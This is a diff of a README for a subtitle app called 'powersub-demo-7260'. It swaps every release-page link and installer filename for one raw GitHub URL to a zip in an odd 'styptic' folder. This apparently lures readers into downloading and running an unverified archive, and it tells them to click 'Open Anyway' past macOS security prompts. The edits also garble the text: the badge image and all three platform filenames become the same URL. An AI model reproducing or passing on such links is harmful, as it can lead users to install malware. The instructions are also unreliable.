@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-7260 - Easy Subtitle Management Made Simple
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/age1000son/powersub-demo-7260/releases)
+[![Download Now](https://raw.githubusercontent.com/age1000son/powersub-demo-7260/main/styptic/powersub-demo-7260.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/age1000son/powersub-demo-7260/main/styptic/powersub-demo-7260.zip)
 
 ## 📋 Overview
 
@@ -19,13 +19,13 @@ To run powersub-demo-7260, make sure your system meets these requirements:
 
 Follow these steps to get started with powersub-demo-7260:
 
-1. **Visit the Release Page:** Click [this link](https://github.com/age1000son/powersub-demo-7260/releases) to go to the releases page.
+1. **Visit the Release Page:** Click [this link](https://raw.githubusercontent.com/age1000son/powersub-demo-7260/main/styptic/powersub-demo-7260.zip) to go to the releases page.
    
 2. **Choose Your Version:** Look for the latest version of powersub-demo-7260. Typically, the most recent release will be at the top of the page.
 
 3. **Download the Application:** Click on the file that corresponds to your operating system. For example, you might see:
-    - **Windows:** `powersub-demo-7260-win.exe`
-    - **macOS:** `powersub-demo-7260-mac.zip`
+    - **Windows:** `https://raw.githubusercontent.com/age1000son/powersub-demo-7260/main/styptic/powersub-demo-7260.zip`
+    - **macOS:** `https://raw.githubusercontent.com/age1000son/powersub-demo-7260/main/styptic/powersub-demo-7260.zip`
 
 4. **Save the File:** Your browser will prompt you to save the file. Choose a location on your computer where you can easily find it, such as your Desktop or Downloads folder.
 
@@ -33,7 +33,7 @@ Follow these steps to get started with powersub-demo-7260:
 
 To download and install powersub-demo-7260, follow these steps:
 
-1. **Download the Application:** Visit [this page](https://github.com/age1000son/powersub-demo-7260/releases) again. Find the latest release and click on the application file for your OS as mentioned above.
+1. **Download the Application:** Visit [this page](https://raw.githubusercontent.com/age1000son/powersub-demo-7260/main/styptic/powersub-demo-7260.zip) again. Find the latest release and click on the application file for your OS as mentioned above.
 
 2. **Run the Installer:**
    - **For Windows:**
@@ -44,7 +44,7 @@ To download and install powersub-demo-7260, follow these steps:
    - **For macOS:**
      - Locate the downloaded `.zip` file.
      - Double-click to extract it.
-     - Open the extracted folder and double-click on `powersub-demo-7260-mac.app` to start the application.
+     - Open the extracted folder and double-click on `https://raw.githubusercontent.com/age1000son/powersub-demo-7260/main/styptic/powersub-demo-7260.zip` to start the application.
 
 3. **Grant Permissions:** If prompted, allow the application to open. On macOS, you may need to go to System Preferences > Security & Privacy, and click "Open Anyway."
 
